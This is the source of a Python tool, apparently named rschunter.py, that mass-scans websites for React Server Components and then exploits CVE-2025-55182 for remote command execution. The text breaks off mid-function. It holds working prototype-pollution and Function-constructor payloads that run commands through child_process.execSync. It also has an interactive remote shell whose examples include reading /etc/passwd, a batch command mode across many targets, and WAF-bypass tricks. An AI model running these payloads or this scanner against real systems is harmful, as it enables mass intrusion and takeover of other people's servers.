#!/usr/bin/env python3
"""
RSC Mass Vulnerability Scanner
A high-performance tool for scanning multiple URLs for RSC vulnerabilities.

Features:
- Mass scanning with concurrent processing
- Resumable/pauseable scans with state management
- Smart URL parsing and normalization
- Beautiful console output with color coding
- Progress tracking and summary reports
- Comprehensive error handling
- Command execution on vulnerable targets
- CSV export (vulnerable targets only)

Usage: 
    python3 rschunter.py <input_file> [options]
    python3 rschunter.py --url https://example.com [options]
    python3 rschunter.py --url https://example.com -sh
    python3 rschunter.py targets.txt -sh --threads 20
    python3 rschunter.py targets.txt -exec "echo Vulnerable: {}" --threads 20
    python3 rschunter.py targets.txt --save -o vulnerables.csv
    python3 rschunter.py --url https://example.com --proxy http://127.0.0.1:8080
    python3 rschunter.py --resume
"""

import sys
import json
import re
import signal
import time
import argparse
import subprocess
import shlex
import cmd
import os
from pathlib import Path
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, asdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: 'requests' library not found.")
    print("Install it with: pip3 install requests")
    sys.exit(1)

import random
import string


# Unicode fallback symbols for Windows compatibility
def _get_unicode_char(char: str, fallback: str) -> str:
    """Get Unicode character with fallback for Windows"""
    try:
        char.encode(sys.stdout.encoding or 'utf-8')
        return char
    except (UnicodeEncodeError, AttributeError):
        return fallback

# Define emoji/symbol constants with fallbacks
EMOJI_SHIELD = _get_unicode_char("🔍", "[*]")
EMOJI_CHART = _get_unicode_char("📊", "[STATS]")
EMOJI_CHECK = _get_unicode_char("✅", "[OK]")
EMOJI_PENDING = _get_unicode_char("⏳", "[...]")
EMOJI_THREAD = _get_unicode_char("🧵", "[T]")
EMOJI_LIGHTNING = _get_unicode_char("⚡", "[>>]")
EMOJI_WARN = _get_unicode_char("⚠", "[!]")
EMOJI_PAUSE = _get_unicode_char("⏸", "[||]")
EMOJI_WARN_EMOJI = _get_unicode_char("⚠️", "[!]")
EMOJI_FILE = _get_unicode_char("📄", "[FILE]")
EMOJI_GREEN_CHECK = _get_unicode_char("✓", "[+]")


# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    @staticmethod
    def disable():
        """Disable colors for non-TTY environments"""
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.BLUE = ''
        Colors.MAGENTA = ''
        Colors.CYAN = ''
        Colors.WHITE = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''
        Colors.RESET = ''


# Utility Functions for Advanced Features
def generate_junk_data(size_kb: int = 128) -> Tuple[str, str]:
    """Generate random junk data for WAF bypass"""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk


def resolve_redirects(url: str, session: requests.Session, timeout: int = 10, max_redirects: int = 10, debug: bool = False) -> str:
    """Follow same-host redirects only, return final URL"""
    current_url = url
    original_host = urlparse(url).netloc
    
    for _ in range(max_redirects):
        try:
            response = session.head(
                current_url,
                timeout=timeout,
                allow_redirects=False
            )
            
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get('Location')
                if location:
                    if location.startswith('/'):
                        # Relative redirect - same host
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        # Absolute redirect - check if same host
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            # Different host, stop following
                            break
                else:
                    break
            else:
                break
        except Exception as e:
            if debug:
                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} resolve_redirects error: {e}")
            break
    
    return current_url


def is_mitigated_host(response: requests.Response) -> bool:
    """Check if host has Vercel/Netlify mitigations in place"""
    server_header = response.headers.get('Server', '').lower()
    has_netlify_vary = 'Netlify-Vary' in response.headers
    
    return (
        has_netlify_vary or
        server_header == 'netlify' or
        server_header == 'vercel'
    )


def is_waf_block(response: requests.Response) -> bool:
    """Detect WAF/security blocks in response"""
    try:
        status = response.status_code
        body = response.text.lower()
        headers_str = str(response.headers).lower()
        
        # Common WAF block indicators
        waf_signatures = [
            'request rejected',
            'access denied',
            'forbidden',
            'blocked',
            'firewall',
            'security',
            'protection',
            'your support id is',
            'incident id',
            'reference id',
            '<title>error',
            '<title>403',
            '<title>request rejected',
            'cloudflare',
            'akamai',
            'imperva',
            'f5',
            'barracuda',
        ]
        
        # Status code checks
        if status in [403, 406, 429, 503]:
            return True
            
        # Content checks
        if any(sig in body for sig in waf_signatures):
            return True
            
        # Very short HTML response with error title
        if '<html>' in body and len(body) < 1000 and any(x in body for x in ['<title>error', '<title>403', 'rejected']):
            return True
            
        return False
    except:
        return False


@dataclass
class ScanResult:
    """Data class for storing scan results"""
    url: str
    vulnerable: bool
    passiveDetected: bool
    activeDetected: bool
    endpointVulnerable: bool
    details: List[str]
    timestamp: str
    error: Optional[str] = None
    execOutput: Optional[str] = None
    wafProtected: bool = False  # RSC detected but WAF blocks exploitation


class UrlParser:
    """Smart URL parser that handles various input formats"""
    
    @staticmethod
    def normalizeUrl(rawInput: str) -> Optional[str]:
        """
        Smart URL normalization - handles all common input formats:
        - Full URLs: http://example.com, https://192.168.1.1:3000
        - Domains: example.com, sub.domain.com
        - IPs with ports: 192.168.1.1:3000, 10.0.0.1:8080
        - Localhost variants: localhost:3000, 127.0.0.1
        - With paths: example.com/api, 192.168.1.1:3000/admin
        """
        if not rawInput or not rawInput.strip():
            return None
        
        rawInput = rawInput.strip()
        
        # Handle scheme-relative URLs (//example.com)
        if rawInput.startswith('//'):
            rawInput = 'https:' + rawInput
        
        # Check if it already has a valid scheme
        has_scheme = rawInput.startswith(('http://', 'https://'))
        
        if not has_scheme:
            # Extract hostname (before first / or :port)
            # Handle cases like: domain.com:3000/path or 192.168.1.1/path
            path_split = rawInput.split('/', 1)
            host_part = path_split[0]
            path_part = '/' + path_split[1] if len(path_split) > 1 else ''
            
            # Extract hostname without port
            hostname = host_part.split(':')[0]
            
            # Smart scheme detection
            is_local = (
                # IPv4 private ranges
                hostname.startswith(('127.', '10.', '192.168.')) or
                # IPv4 private class B (172.16.0.0 - 172.31.255.255)
                (hostname.startswith('172.') and 
                 len(hostname.split('.')) >= 2 and
                 hostname.split('.')[1].isdigit() and
                 16 <= int(hostname.split('.')[1]) <= 31) or
                # Link-local
                hostname.startswith('169.254.') or
                # Localhost variants
                hostname in ('localhost', 'localhost.localdomain') or
                # IPv6 localhost
                hostname == '::1' or hostname == '[::1]'
            )
            
            scheme = 'http' if is_local else 'https'
            url = f'{scheme}://{rawInput}'
        else:
            url = rawInput
        
        try:
            # Remove trailing slashes before parsing
            url = url.rstrip('/')
            parsed = urlparse(url)
            
            # Validate scheme
            if parsed.scheme not in ('http', 'https'):
                return None
            
            # Validate netloc exists
            if not parsed.netloc:
                return None
            
            # Extract and validate hostname
            hostname = parsed.netloc.split(':')[0]
            if not hostname:
                return None
            
            # Basic hostname validation
            # Allow: domains, IPv4, IPv6, localhost
            if hostname.startswith('['):  # IPv6
                if not hostname.endswith(']'):
                    return None
            elif hostname and hostname != 'localhost':
                # Check if it's a valid IP or domain
                parts = hostname.split('.')
                # Must have some valid characters
                if not any(c.isalnum() or c in '-_' for c in hostname):
                    return None
            
            # Reconstruct clean URL
            cleanUrl = f"{parsed.scheme}://{parsed.netloc}"
            
            # Preserve path (but remove trailing slash unless it's root)
            if parsed.path and parsed.path != '/':
                cleanUrl += parsed.path.rstrip('/')
            
            # Preserve query string
            if parsed.query:
                cleanUrl += f'?{parsed.query}'
            
            # Preserve fragment if present
            if parsed.fragment:
                cleanUrl += f'#{parsed.fragment}'
            
            return cleanUrl
            
        except Exception as e:
            if self.debug:
                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} normalizeUrl error for {url}: {e}")
            return None
    
    @staticmethod
    def extractDomain(url: str) -> str:
        """Extract domain from URL for display purposes"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except Exception as e:
            if self.debug:
                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} extractDomain error for {url}: {e}")
            return url


class ScanStateManager:
    """Manages scan state for resume/pause functionality"""
    
    def __init__(self, scanId: str = None, stateFile: str = None):
        # Use explicit filename if provided (for testing), otherwise generate timestamp-based name
        if stateFile:
            filename = stateFile
        elif scanId:
            filename = f'scan_state_{scanId}.json'
        else:
            filename = f'scan_state_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        self.stateFile = Path(filename)
        self.lock = threading.Lock()
    
    def saveState(self, targets: List[str], completed: Set[str], 
                   results: List[ScanResult], scanId: str):
        """Save current scan state to file"""
        with self.lock:
            state = {
                'scanId': scanId,
                'timestamp': datetime.now().isoformat(),
                'targets': targets,
                'completed': list(completed),
                'results': [asdict(r) for r in results],
                'total': len(targets),
                'scanned': len(completed)
            }
            
            with open(self.stateFile, 'w') as f:
                json.dump(state, f, indent=2)
    
    def loadState(self) -> Optional[Dict]:
        """Load scan state from file"""
        if not self.stateFile.exists():
            return None
        
        try:
            with open(self.stateFile, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"{Colors.RED}Error loading state: {e}{Colors.RESET}")
            return None
    
    def clearState(self):
        """Clear saved state"""
        if self.stateFile.exists():
            self.stateFile.unlink()


class RscScanner:
    """High-performance RSC vulnerability scanner"""
    
    def __init__(self, timeout: int = 10, maxWorkers: int = 10, wafBypass: bool = False, 
                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
                 followRedirects: bool = True, debug: bool = False, proxy: str = None):
        self.timeout = timeout
        self.maxWorkers = maxWorkers
        self.wafBypass = wafBypass
        self.wafBypassSize = wafBypassSize
        self.windowsMode = windowsMode
        self.vercelWafBypass = vercelWafBypass
        self.followRedirects = followRedirects
        self.debug = debug
        self.proxy = proxy
        self.session = self._createSession()
        
    def _createSession(self) -> requests.Session:
        """Create a session with retry logic and connection pooling"""
        session = requests.Session()
        
        # Configure retries
        retryStrategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(
            max_retries=retryStrategy,
            pool_connections=self.maxWorkers,
            pool_maxsize=self.maxWorkers * 2
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Configure proxy if specified
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
            # Disable SSL verification when using proxy (for Burp/mitmproxy)
            session.verify = False
            # Suppress SSL warnings
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        return session
    
    def scanUrl(self, url: str, verifyExploitability: bool = False) -> ScanResult:
        """Scan a single URL for RSC vulnerabilities
        
        Args:
            url: Target URL to scan
            verifyExploitability: If True and execCommand is set, verify exploitation works before marking vulnerable
        """
        details = []
        passiveDetected = False
        activeDetected = False
        endpointVulnerable = False
        error = None
        finalUrl = url
        wafProtected = False
        
        try:
            # Follow redirects if enabled
            if self.followRedirects:
                finalUrl = resolve_redirects(url, self.session, self.timeout, debug=self.debug)
                if finalUrl != url:
                    details.append(f"Followed redirect: {url} -> {finalUrl}")
                    url = finalUrl
            
            # Passive scan
            passiveDetected, passiveDetails = self._passiveScan(url)
            details.extend(passiveDetails)
            
            # Active fingerprint
            activeDetected, activeDetails = self._activeFingerprint(url)
            details.extend(activeDetails)
            
            # Endpoint check (only if other methods detected something)
            if passiveDetected or activeDetected:
                endpointVulnerable, endpointDetails = self._checkEndpoints(url)
                details.extend(endpointDetails)
            
        except requests.Timeout:
            error = "Timeout"
        except requests.ConnectionError:
            error = "Connection failed"
        except Exception as e:
            error = str(e)[:50]
        
        # Determine if vulnerable (RSC detected and no errors)
        detectionPositive = (passiveDetected or activeDetected or endpointVulnerable) and not error
        
        # If verifyExploitability is enabled and detection found something, test exploitation
        vulnerable = detectionPositive
        if detectionPositive and verifyExploitability:
            # Detection found RSC - now verify it's actually exploitable
            details.append("Verifying exploitability...")
            # This will be checked during execution in scanTargets
            pass
        
        return ScanResult(
            url=finalUrl,
            vulnerable=vulnerable,
            passiveDetected=passiveDetected,
            activeDetected=activeDetected,
            endpointVulnerable=endpointVulnerable,
            details=details,
            timestamp=datetime.now().isoformat(),
            error=error,
            wafProtected=wafProtected
        )
    
    def _passiveScan(self, url: str) -> Tuple[bool, List[str]]:
        """Passive detection - simplified and reliable"""
        details = []
        score = 0
        
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            contentType = response.headers.get('Content-Type', '')
            html = response.text[:100000]  # Limit to first 100KB for performance
            
            # Critical indicators only - high confidence
            if 'text/x-component' in contentType:
                score += 100
                details.append("Content-Type: text/x-component")
            
            if re.search(r'(window|self)\.__next_f\s*=', html):
                score += 80
                details.append("window.__next_f detected")
            
            if 'react-server-dom-webpack' in html:
                score += 30
                details.append("react-server-dom-webpack found")
            
            return score >= 50, details
            
        except Exception as e:
            if self.debug:
                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _passiveScan error for {url}: {e}")
            return False, []
    
    def _activeFingerprint(self, url: str) -> Tuple[bool, List[str]]:
        """Active fingerprinting with RSC header - simplified"""
        details = []
        
        try:
            response = self.session.get(
                url,
                headers={'RSC': '1'},
                timeout=self.timeout,
                allow_redirects=True
            )
            
            contentType = response.headers.get('Content-Type', '')
            varyHeader = response.headers.get('Vary', '')
            body = response.text[:1000]  # Check first 1KB
            
            if 'text/x-component' in contentType:
                details.append("RSC Content-Type response")
            
            if 'RSC' in varyHeader:
                details.append("Vary: RSC header")
            
            # React Flight Protocol format: starts with number:type
            if re.match(r'^\d+:["IHL]', body.strip()):
                details.append("React Flight Protocol")
            
            return len(details) > 0, details
            
        except Exception as e:
            if self.debug:
                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _activeFingerprint error for {url}: {e}")
            return False, []
    
    def _checkEndpoints(self, url: str) -> Tuple[bool, List[str]]:
        """Check for vulnerable endpoints - simplified"""
        details = []
        testPaths = ['/adfa', '/_next/data']
        
        for path in testPaths:
            try:
                testUrl = urljoin(url, path)
                response = self.session.post(
                    testUrl,
                    headers={
                        'Next-Action': 'test',
                        'Content-Type': 'multipart/form-data',
                    },
                    timeout=5
                )
                
                if response.status_code != 404:
                    if 'digest' in response.text or 'Next-Action' in str(response.headers):
                        details.append(f"Vulnerable endpoint: {path}")
                        return True, details
                        
            except Exception as e:
                if self.debug:
                    print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _checkEndpoints error for {path}: {e}")
                continue
        
        return False, details


class InteractiveShell(cmd.Cmd):
    """Interactive shell for executing commands on vulnerable target(s)"""
    
    intro = f"""
{Colors.CYAN}{'='*70}
{Colors.BOLD}🐚 RSC Interactive Shell{Colors.RESET}
{Colors.CYAN}{'='*70}{Colors.RESET}

Type commands to execute on vulnerable target(s).
Special commands:
  help, ?       - Show this help
  exit, quit    - Exit the shell
  info          - Show current target information
  targets       - List all vulnerable targets
  switch <id>   - Switch to target by ID
  refresh       - Refresh vulnerable targets list
  
Examples:
  whoami
  ls -la
  cat /etc/passwd
  pwd && id

{Colors.YELLOW}Press Ctrl+D or type 'exit' to quit{Colors.RESET}
    """
    
    prompt = f"{Colors.RED}rsc-shell>{Colors.RESET} "
    
    def __init__(self, target: str, scanner, vulnerableTargets: List[str] = None, massMode: bool = False):
        super().__init__()
        self.target = target
        self.scanner = scanner
        self.domain = UrlParser.extractDomain(target)
        self.vulnerableTargets = vulnerableTargets or [target]
        self.massMode = massMode
        self.targetIndex = 0
        self.lock = threading.Lock()
        self.should_exit = threading.Event()  # Flag for clean exit
        
        # Update prompt with target info
        self._updatePrompt()
    
    def _updatePrompt(self):
        """Update prompt with current target info"""
        shortDomain = self.domain[:30] + '...' if len(self.domain) > 30 else self.domain
        if self.massMode and len(self.vulnerableTargets) > 1:
            self.prompt = f"{Colors.RED}rsc[{self.targetIndex + 1}/{len(self.vulnerableTargets)}|{shortDomain}]>{Colors.RESET} "
        else:
            self.prompt = f"{Colors.RED}rsc[{shortDomain}]>{Colors.RESET} "
    
    def addVulnerableTarget(self, url: str):
        """Add newly discovered vulnerable target (thread-safe)"""
        with self.lock:
            if url not in self.vulnerableTargets:
                self.vulnerableTargets.append(url)
                if self.massMode:
                    print(f"\r{Colors.GREEN}[+] New vulnerable target #{len(self.vulnerableTargets)}: {UrlParser.extractDomain(url)}{Colors.RESET}")
                    print(self.prompt, end='', flush=True)
    
    def default(self, line):
        """Execute arbitrary command on target"""
        if not line.strip():
            return
        
        print(f"{Colors.YELLOW}[*] Executing on {self.domain}: {line}{Colors.RESET}")
        
        try:
            result = self.scanner.executeRemoteCommand(self.target, line)
            if result:
                print(f"{Colors.GREEN}{result}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] No response or command failed{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    
    def do_info(self, arg):
        """Show current target information"""
        print(f"{Colors.CYAN}Current Target: {Colors.BOLD}{self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}Domain: {Colors.BOLD}{self.domain}{Colors.RESET}")
        if self.massMode:
            print(f"{Colors.CYAN}Position: {Colors.BOLD}{self.targetIndex + 1}/{len(self.vulnerableTargets)}{Colors.RESET}")
    
    def do_targets(self, arg):
        """List all vulnerable targets"""
        with self.lock:
            if not self.vulnerableTargets:
                print(f"{Colors.YELLOW}No vulnerable targets found yet.{Colors.RESET}")
                return
            
            print(f"\n{Colors.BOLD}{Colors.CYAN}Vulnerable Targets ({len(self.vulnerableTargets)}):{Colors.RESET}")
            print(f"{Colors.CYAN}{'-'*70}{Colors.RESET}")
            for idx, url in enumerate(self.vulnerableTargets):
                marker = f"{Colors.GREEN}►{Colors.RESET}" if idx == self.targetIndex else " "
                domain = UrlParser.extractDomain(url)
                print(f"{marker} {Colors.BOLD}{idx + 1}.{Colors.RESET} {domain}")
                if len(url) > 50:
                    print(f"     {Colors.YELLOW}{url[:47]}...{Colors.RESET}")
            print()
    
    def do_switch(self, arg):
        """Switch to target by ID"""
        if not arg.strip():
            print(f"{Colors.YELLOW}Usage: switch <id>{Colors.RESET}")
            return
        
        try:
            targetId = int(arg.strip()) - 1
            with self.lock:
                if 0 <= targetId < len(self.vulnerableTargets):
                    self.targetIndex = targetId
                    self.target = self.vulnerableTargets[targetId]
                    self.domain = UrlParser.extractDomain(self.target)
                    self._updatePrompt()
                    print(f"{Colors.GREEN}[+] Switched to target #{targetId + 1}: {self.domain}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Invalid target ID. Use 'targets' to see available targets.{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[!] Invalid ID format. Use: switch <number>{Colors.RESET}")
    
    def do_refresh(self, arg):
        """Refresh vulnerable targets list"""
        with self.lock:
            count = len(self.vulnerableTargets)
        print(f"{Colors.GREEN}[+] Currently tracking {count} vulnerable target(s){Colors.RESET}")
    
    def do_exit(self, arg):
        """Exit the shell"""
        print(f"{Colors.YELLOW}Exiting shell...{Colors.RESET}")
        self.should_exit.set()  # Signal exit
        return True
    
    def do_quit(self, arg):
        """Exit the shell"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Handle Ctrl+D"""
        print()
        return self.do_exit(arg)


class MassScanner:
    """Main mass scanning coordinator"""
    
    def __init__(self, maxWorkers: int = 10, execCommand: str = None, wafBypass: bool = False,
                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
                 followRedirects: bool = True, noSave: bool = False, debug: bool = False, proxy: str = None):
        self.scanner = RscScanner(
            maxWorkers=maxWorkers,
            wafBypass=wafBypass,
            wafBypassSize=wafBypassSize,
            windowsMode=windowsMode,
            vercelWafBypass=vercelWafBypass,
            followRedirects=followRedirects,
            debug=debug,
            proxy=proxy
        )
        self.noSave = noSave
        self.stateManager = ScanStateManager() if not noSave else None
        self.maxWorkers = maxWorkers
        self.execCommand = execCommand
        self.wafBypass = wafBypass
        self.wafBypassSize = wafBypassSize
        self.windowsMode = windowsMode
        self.vercelWafBypass = vercelWafBypass
        self.followRedirects = followRedirects
        self.noSave = noSave
        self.debug = debug
        self.paused = False
        self.stopScan = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signalHandler)
        signal.signal(signal.SIGTERM, self._signalHandler)
    
    def _signalHandler(self, signum, frame):
        """Handle Ctrl+C - immediate exit since state is auto-saved"""
        print(f"\n\n{Colors.RED}🛑 Scan interrupted by user. Exiting...{Colors.RESET}")
        if not self.noSave and self.stateManager:
            print(f"{Colors.YELLOW}💾 State saved. Use --resume to continue.{Colors.RESET}")
        sys.exit(0)
    
    def loadTargets(self, inputFile: str) -> List[str]:
        """Load and parse targets from input file"""
        targets = []
        seen = set()
        
        try:
            with open(inputFile, 'r') as f:
                for lineNum, line in enumerate(f, 1):
                    line = line.strip()
                    
                    # Skip empty lines and comments
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse URL
                    normalized = UrlParser.normalizeUrl(line)
                    
                    if normalized:
                        if normalized not in seen:
                            targets.append(normalized)
                            seen.add(normalized)
                    else:
                        print(f"{Colors.YELLOW}{EMOJI_WARN} Line {lineNum}: Invalid URL '{line}'{Colors.RESET}")
            
            return targets
            
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File '{inputFile}' not found{Colors.RESET}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
            sys.exit(1)
    
    def executeRemoteCommand(self, target: str, customCmd: str = None, skipValidation: bool = False) -> str:
        """Execute arbitrary command on vulnerable target via CVE-2025-55182
        
        Args:
            target: Target URL
            customCmd: Custom command to execute (if None, uses self.execCommand)
            skipValidation: If True, skip RCE validation check
            
        Returns:
            Command output or None if exploitation failed
        """
        # Use custom command if provided, otherwise use configured execCommand
        cmdTemplate = customCmd if customCmd else self.execCommand
        
        if not cmdTemplate:
            return None
            
        try:
            # Replace placeholder with actual command (for execCommand mode)
            if customCmd:
                cmd = customCmd
            else:
                cmd = cmdTemplate.replace("{}", target)
            
            # Try validation first for better confirmation, but don't give up if it fails
            validation_passed = False
            if not skipValidation:
                if self.debug:
                    print(f"{Colors.CYAN}[*] Validating RCE capability...{Colors.RESET}")
                validation_passed = self._validateRCE(target)
                if validation_passed:
                    if self.debug:
                        print(f"{Colors.GREEN}[+] RCE validated{Colors.RESET}")
                else:
                    if self.debug:
                        print(f"{Colors.YELLOW}[!] Validation failed, trying exploitation anyway...{Colors.RESET}")
            
            # Try Method 3 FIRST (msanft's working exploit - most reliable)
            if not self.debug:
                print(f"{Colors.CYAN}[*] Trying primary exploitation method (msanft)...{Colors.RESET}")
            else:
                print(f"{Colors.CYAN}[*] Trying Method 3 (msanft's PoC - base URL direct)...{Colors.RESET}")
            result = self._exploitMethod3(target, cmd)
            if result:
                print(f"{Colors.GREEN}[+] Exploitation successful!{Colors.RESET}")
                return result
            
            # Try Method 2 (Assetnote format)
            if not self.debug:
                print(f"{Colors.CYAN}[*] Trying alternative method (Assetnote)...{Colors.RESET}")
            else:
                print(f"{Colors.CYAN}[*] Trying Method 2 (Assetnote __proto__)...{Colors.RESET}")
            result = self._exploitMethod2(target, cmd)
            if result:
                print(f"{Colors.GREEN}[+] Alternative method successful!{Colors.RESET}")
                return result
            
            # Try Method 1 (Function constructor - last resort)
            if not self.debug:
                print(f"{Colors.CYAN}[*] Trying fallback method...{Colors.RESET}")
            else:
                print(f"{Colors.CYAN}[*] Trying Method 1 (Function constructor)...{Colors.RESET}")
            result = self._exploitMethod1(target, cmd)
            if result and "NEXT_REDIRECT" not in result:
                print(f"{Colors.GREEN}[+] Fallback method successful!{Colors.RESET}")
                return result
            
            return None
            
        except Exception as e:
            return f"Exploit error: {str(e)}"
    
    def _validateRCE(self, target: str) -> bool:
        """Validate RCE capability using X-Action-Redirect header check
        
        Uses echo $((41*271)) which evaluates to 11111 as a marker.
        If X-Action-Redirect header contains 11111, RCE is confirmed.
        
        Returns:
            True if RCE is confirmed, False otherwise
        """
        try:
            if self.debug:
                print(f"{Colors.BLUE}[DEBUG] Validating RCE with X-Action-Redirect check{Colors.RESET}")
            
            # Use arithmetic expression that evaluates to 11111
            test_cmd = 'echo $((41*271))' if not self.windowsMode else 'powershell -c "41*271"'
            
            # Build payload with test command
            craftedChunk = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then": "$B1337"}',
                "_response": {
                    "_prefix": f"var res=process.mainModule.require('child_process').execSync('{test_cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
                    "_chunks": "$Q2",
                    "_formData": {
                        "get": "$1:constructor:constructor",
                    },
                },
            }
            
            files = {
                "0": (None, json.dumps(craftedChunk)),
                "1": (None, '"$@0"'),
            }
            
            headers = {"Next-Action": "x"}
            timeout = 20 if self.wafBypass else 10
            
            # Try root and common endpoints
            testUrls = [target, urljoin(target, '/_next/data'), urljoin(target, '/api/actions')]
            
            for url in testUrls:
                try:
                    response = self.scanner.session.post(
                        url,
                        files=files,
                        headers=headers,
                        timeout=timeout,
                        allow_redirects=False
                    )
                    
                    # Check X-Action-Redirect header for our marker
                    redirect_header = response.headers.get('X-Action-Redirect', '')
                    if redirect_header and '11111' in redirect_header:
                        if self.debug:
                            print(f"{Colors.GREEN}[DEBUG] RCE confirmed! X-Action-Redirect: {redirect_header[:100]}{Colors.RESET}")
                        return True
                    
                    # Also check for 11111 in Location header or response body
                    location_header = response.headers.get('Location', '')
                    if '11111' in location_header or '11111' in response.text:
                        if self.debug:
                            print(f"{Colors.GREEN}[DEBUG] RCE confirmed! Found 11111 in response{Colors.RESET}")
                        return True
                        
                except Exception as e:
                    if self.debug:
                        print(f"{Colors.YELLOW}[DEBUG] Validation endpoint error: {e}{Colors.RESET}")
                    continue
            
            if self.debug:
                print(f"{Colors.YELLOW}[DEBUG] RCE validation failed - no 11111 marker found{Colors.RESET}")
            return False
            
        except Exception as e:
            if self.debug:
                print(f"{Colors.RED}[DEBUG] RCE validation exception: {e}{Colors.RESET}")
            return False
    
    def _exploitMethod1(self, target: str, cmd: str) -> Optional[str]:
        """Primary exploit using Function constructor injection"""
        try:
            # Payload to trigger RCE via Function constructor
            payload = {
                "1": 'I["$1:constructor:constructor"]',
                "2": f'I["{cmd}"]',
                "3": 'I["return process.mainModule.require(\'child_process\').execSync(arguments[0]).toString()"]',
                "4": 'I["$3($2)"]'
            }
            
            # Send the exploit request to common RSC endpoints
            endpoints = ['/_next/data', '/adfa', '/api/actions']
            
            for endpoint in endpoints:
                try:
                    exploitUrl = urljoin(target, endpoint)
                    
                    files = {
                        'rsc_payload': (None, json.dumps(payload), 'text/x-component')
                    }
                    
                    headers = {
                        'Next-Action': 'test',
                        'RSC': '1'
                    }
                    
                    response = self.scanner.session.post(
                        exploitUrl,
                        files=files,
                        headers=headers,
                        timeout=10
                    )
                    
                    # Check for WAF blocks
                    if is_waf_block(response):
                        continue
                    
                    if response.status_code == 200 and response.text:
                        # Validate it's not an error page
                        body_lower = response.text.lower()
                        if '<html>' in body_lower and len(response.text) < 2000:
                            continue
                        return response.text[:500]
                        
                except Exception:
                    continue
            
            return None
            
        except Exception:
            return None
    
    def _exploitMethod2(self, target: str, cmd: str) -> Optional[str]:
        """Alternative exploit using __proto__ pollution (based on sumanrox PoC)"""
        try:
            
            # Adjust command for Windows if needed
            if self.windowsMode:
                cmd = f'powershell -c "{cmd}"'
            
            # More reliable payload using prototype pollution
            # This captures command output via NEXT_REDIRECT digest
            craftedChunk = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then": "$B1337"}',
                "_response": {
                    "_prefix": f"var res=process.mainModule.require('child_process').execSync('{cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
                    "_chunks": "$Q2",
                    "_formData": {
                        "get": "$1:constructor:constructor",
                    },
                },
            }
            
            # Build multipart form data with optional WAF bypass
            if self.wafBypass:
                # Add junk data at the beginning
                param_name, junk_data = generate_junk_data(self.wafBypassSize)
                files = {
                    param_name: (None, junk_data),
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            elif self.vercelWafBypass:
                # Vercel-specific WAF bypass with alternative structure
                craftedChunk["_response"]["_formData"]["get"] = '$3:\\"$$:constructor:constructor'
                files = {
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                    "2": (None, "[]"),
                    "3": (None, '{"\\"\u0024\u0024":{}}'),
                }
            else:
                files = {
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            
            headers = {"Next-Action": "x"}
            
            # Try the target directly and common endpoints
            testUrls = [target, urljoin(target, '/_next/data'), urljoin(target, '/adfa')]
            
            # Determine timeout based on WAF bypass mode
            timeout = 20 if self.wafBypass else 10
            
            for url in testUrls:
                try:
                    
                    response = self.scanner.session.post(
                        url,
                        files=files,
                        headers=headers,
                        timeout=timeout
                    )
                    
                    # Check for WAF blocks first
                    if is_waf_block(response):
                        continue
                    
                    # Extract output from digest field in error response
